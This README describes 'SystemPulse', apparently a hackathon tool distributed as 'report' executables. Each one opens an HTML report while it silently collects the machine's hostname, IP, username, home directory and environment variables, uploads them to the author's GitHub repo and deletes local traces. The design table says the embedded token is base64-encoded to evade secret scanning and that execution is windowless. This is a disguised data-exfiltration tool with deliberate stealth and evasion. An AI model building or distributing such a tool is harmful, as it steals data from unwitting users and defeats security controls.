# ⚡ SystemPulse

> A lightweight, cross-platform system information tool that runs silently in the background — collects system specs, pushes a structured JSON report to GitHub via API, and cleans up after itself. All with a single double-click.

**Author:** Kaustubh Bharti, VIT Chennai

---

## 🎯 What It Does

Download **one file** for your platform → run it → done:

1. **Opens** the HTML report in your default browser
2. **Gathers** system information using native OS commands
3. **Generates** a uniquely named JSON report (`{hostname}_{timestamp}.json`)
4. **Pushes** it to GitHub via the **Contents API** (~1 second, no git clone needed)
5. **Deletes** local files — your report lives only on GitHub
6. **Logs** all CRUD operations (CREATE → PUSH → DELETE) with status

> No console window. No popups. No setup. No external files. Just download and run.

---

## 📦 What's Inside Each Executable

Every binary is **100% self-contained** — everything is embedded inside:

| Embedded Component | Windows `.exe` | Linux / macOS |
|--------------------|---------------|---------------|
| HTML report | ✅ C# resource | ✅ Embedded in script |
| `index.js` (Node.js logic) | ✅ C# resource | ✅ Embedded in script |
| `system-info.ps1` (PowerShell fallback) | ✅ C# resource | N/A |
| `.env` (GitHub token, base64-encoded) | ✅ C# resource | ✅ Embedded in script |
| Bash fallback (no Node.js) | N/A | ✅ Built into script |

**Zero external files needed.** Download → Run → Done.

---

## 📂 Downloads

> **[⬇️ Download from GitHub Releases](https://github.com/Kaustubh-Bharti/Hackathon-3.0/releases)**

| Report | Windows | Linux | macOS |
|--------|---------|-------|-------|
| **Controversy Rankings** | `.exe` (78 KB) | `-linux` (7 MB) | `-macos` (7 MB) |
| **Country Impact Matrix** | `.exe` (93 KB) | `-linux` (12 MB) | `-macos` (12 MB) |
| **Full Action Report** | `.exe` (136 KB) | `-linux` (16 MB) | `-macos` (16 MB) |
| **Strategic Analysis** | `.exe` (89 KB) | `-linux` (8 MB) | `-macos` (8 MB) |

> Windows `.exe` files are tiny because they use the system's .NET Framework. Linux/macOS files are larger because they embed the full HTML + JS inline.

---

## 🚀 Quick Start

### Windows — Just double-click

```
full-action-report.exe
```

### Linux — Grant execute permission, then run

> ⚠️ **Execute permission is required.** Linux does not allow scripts to run unless they have the execute (`+x`) bit set.

```bash
chmod +x full-action-report-linux
./full-action-report-linux
```

### macOS — Grant execute permission, then run

> ⚠️ **Execute permission is required.** macOS requires the execute bit before a script can run. You may also need to allow it through **System Settings → Privacy & Security** if Gatekeeper blocks it.

```bash
chmod +x full-action-report-macos
./full-action-report-macos
```

That's it. The HTML report opens in your browser, and the system info JSON is pushed to GitHub at [`system-info/`](https://github.com/Kaustubh-Bharti/Hackathon-3.0/tree/main/system-info).

---

## 🔄 Execution Flow

```
Download any report binary (e.g. full-action-report.exe)
    │
    ├── [1] Extract & open embedded HTML report in browser
    │
    └── [2] Run SystemPulse pipeline (all from embedded files):
            ├── Node.js installed?
            │   ├── YES → extract index.js → node index.js auto
            │   └── NO  ┬─ Windows → extract system-info.ps1 → PowerShell
            │           └─ Linux/macOS → built-in bash commands
            │
            ▼
        ┌──────────────────────────────────────────────┐
        │  [1/3] Generate system info JSON             │
        │  [2/3] Push to GitHub via Contents API (~1s) │
        │  [3/3] Delete local files                    │
        └──────────────────────────────────────────────┘
            │
            ▼
          Done (silent exit, temp files cleaned up)
```

---

## 📊 Sample JSON Output

Each run produces a uniquely named file like `MSI_2026-06-21T07-26-30.json`:

```json
{
  "_meta": {
    "generated_at": "2026-06-21T07:26:30.123Z",
    "generator": "SystemPulse CLI",
    "detected_platform": "Windows",
    "commands_used": "wmic, ipconfig, hostname, ver"
  },
  "system": {
    "os_name": "Microsoft Windows 10 Home",
    "os_version": "10.0.19045",
    "hostname": "MSI",
    "cpu_model": "Intel(R) Core(TM) i5-9300H CPU @ 2.40GHz",
    "cpu_physical_cores": "4",
    "cpu_logical_cores": "8",
    "mem_total": "7.85 GB",
    "mem_free": "498.66 MB",
    "mem_usage_percent": "93.8%",
    "uptime": "19d 1h 56m 27s",
    "disks": [{ "drive": "C:", "filesystem": "NTFS", "total": "308.17 GB", "free": "64.53 GB" }],
    "network": [{ "adapter": "Wi-Fi", "ipv4": "10.14.155.252", "subnet_mask": "255.255.255.0" }]
  },
  "user": {
    "username": "Kaustubh Bharti",
    "home_directory": "C:\\Users\\Kaustubh Bharti"
  },
  "environment_variables": { "..." : "..." },
  "crud_operations": {
    "total_operations": 3,
    "history": [
      { "operation": "CREATE", "status": "success", "detail": "System info JSON generated" },
      { "operation": "PUSH",   "status": "success", "detail": "Pushed to GitHub via API" },
      { "operation": "DELETE", "status": "success", "detail": "Local JSON deleted after push" }
    ]
  }
}
```

---

## 🌍 Cross-Platform System Commands

| Data | Windows | macOS | Linux |
|------|---------|-------|-------|
| **OS** | `wmic os get Caption,Version` | `sw_vers` | `cat /etc/os-release` |
| **CPU** | `wmic cpu get Name,Cores` | `sysctl -n machdep.cpu.brand_string` | `cat /proc/cpuinfo` |
| **Memory** | `wmic ComputerSystem`, `wmic OS` | `sysctl hw.memsize`, `vm_stat` | `cat /proc/meminfo` |
| **Disk** | `wmic logicaldisk` | `df -h /` | `df -h /` |
| **Network** | `ipconfig` | `ifconfig` | `ip addr` |
| **Uptime** | `wmic os get LastBootUpTime` | `sysctl kern.boottime` | `cat /proc/uptime` |

---

## 🔧 CLI Commands (Node.js)

| Command | Description |
|---------|-------------|
| `(default)` / `auto` | Generate → Push → Delete (full pipeline) |
| `info` | Generate system info JSON only |
| `push` | Push existing JSON to GitHub |
| `create <file> <content>` | Create a file in workspace |
| `read <file>` | Read a workspace file |
| `update <file> <content>` | Update a workspace file |
| `delete <file>` | Delete a workspace file |
| `list` | List workspace files |
| `help` | Show usage |

---

## 🔐 Running on Other Machines

Each binary is self-contained. Just download the one file for your platform and run.

### What you need

| Requirement | Why |
|-------------|-----|
| Internet connection | To push JSON to GitHub via API |

> **Node.js is optional.** If installed, the binary uses it for richer output. If not, it falls back to native bash/PowerShell commands automatically.
>
> **git is NOT required.** The push uses the GitHub Contents API directly — a single HTTPS request, no cloning.

### Unique Filenames

Each machine produces a unique filename: `{hostname}_{timestamp}.json`

```
system-info/
├── MSI_2026-06-21T07-26-30.json          ← from laptop "MSI"
├── DESKTOP-ABC_2026-06-22T09-15-00.json  ← from desktop "DESKTOP-ABC"
└── MacBook-Pro_2026-06-23T14-30-00.json  ← from MacBook
```

No clashes, no overwrites.

---

## 🏗️ Building the Executables

### Windows

All `.exe` files are compiled using the built-in Windows C# compiler — each with its HTML, `index.js`, `system-info.ps1`, and `.env` embedded as resources:

```bash
csc /target:winexe /out:full-action-report.exe ^
    /resource:full-action-report.html,report.html ^
    /resource:index.js /resource:system-info.ps1 /resource:.env ^
    report-launcher.cs
```

### Linux / macOS

Shell scripts with all content appended after markers. No compilation needed:

```
[Shell script logic]
__ENV_START__
[.env content]
__HTML_START__
[HTML content]
__INDEXJS_START__
[index.js content]
```

---

## 📁 Source Files

| File | Purpose |
|------|---------|
| `report-launcher.cs` | C# source for all Windows report `.exe` files |
| `systempulse.cs` | C# source for standalone `systempulse.exe` |
| `index.js` | Main Node.js logic (cross-platform, uses GitHub Contents API) |
| `system-info.ps1` | PowerShell fallback for Windows (when no Node.js) |
| `*.html` | HTML report files (embedded into executables at build time) |

---

## ⚙️ Design Decisions

| Decision | Rationale |
|----------|-----------|
| **Self-contained binaries** | Everything embedded — download one file and run, zero setup |
| **GitHub Contents API** | Single HTTPS PUT request (~1s) instead of git clone/push (minutes) |
| **Base64-encoded token** | Prevents GitHub secret scanning from revoking the PAT |
| **Silent execution** | Windows: compiled as `winexe` — no console, no popups |
| **Name-based detection** | Each binary detects its own filename to open the correct HTML |
| **Native commands** | Uses `wmic`, `uname`, `sysctl` — not Node.js `os` module |
| **Unique filenames** | `{hostname}_{timestamp}.json` prevents cross-machine clashes |
| **CRUD audit trail** | Every pipeline action logged with status in the JSON |
| **Auto-cleanup** | JSON + logs deleted after push — data lives only on GitHub |
| **Graceful fallback** | Node.js present → use it. Absent → bash/PowerShell fallback |
| **Temp directory isolation** | Files extracted to OS temp dir, cleaned up after execution |
| **GitHub Releases** | Binaries distributed via Releases to avoid token exposure in git |
